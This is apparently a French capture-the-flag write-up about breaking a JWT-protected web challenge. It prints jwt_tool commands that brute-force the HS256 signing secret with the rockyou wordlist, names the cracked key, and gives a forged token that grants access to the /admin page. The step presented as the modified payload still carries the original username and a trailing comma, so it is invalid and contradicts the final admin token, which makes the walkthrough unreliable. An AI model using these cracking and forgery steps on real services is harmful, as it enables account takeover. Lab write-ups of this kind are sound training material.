# Write-up

Créer un JWT avec le pseudo de la persone : `{"pseudo": "drachh"}`. On reçoit la réponse du serveur avec le token signé.

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRyYWNoaCIsImV4cCI6MTc0MTY0MDE4MH0.n6tJsCLw0RiQxL_xBFV9MHbeTtR_T2CarH5uCJQxEFM"
}
```

On peut utiliser un outil comme `jwt.io` pour décoder le token et voir la payload.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "drachh",
  "exp": 1741640180
}
```

```bash
# Extrait la payload du token
jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRyYWNoaCIsImV4cCI6MTc0MTY0MDE4MH0.n6tJsCLw0RiQxL_xBFV9MHbeTtR_T2CarH5uCJQxEFM"

# Bruteforce le token
jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRyYWNoaCIsImV4cCI6MTc0MTY0MDE4MH0.n6tJsCLw0RiQxL_xBFV9MHbeTtR_T2CarH5uCJQxEFM" -C -d /usr/share/wordlists/rockyou.txt
```

On trouve la clé de chiffrement `lovelovelove`. On peut maintenant modifier la payload du token pour récupérer le flag. Pour cela rien de plus simple. On utilise la payload suivante dans JWT.io :

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "drachh",
  "exp": 1741640180,
}
```

Puis on signe avec la clé `lovelovelove`, il suffit de remplace le token dans les cookies du navigateur et visiter la page `/admin` pour obtenir le flag : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQxNjQwMTgwfQ.TBYe9qyXLs17zhQU5AtWxJiNMkWBqhCJ6qnZhums3VI`.
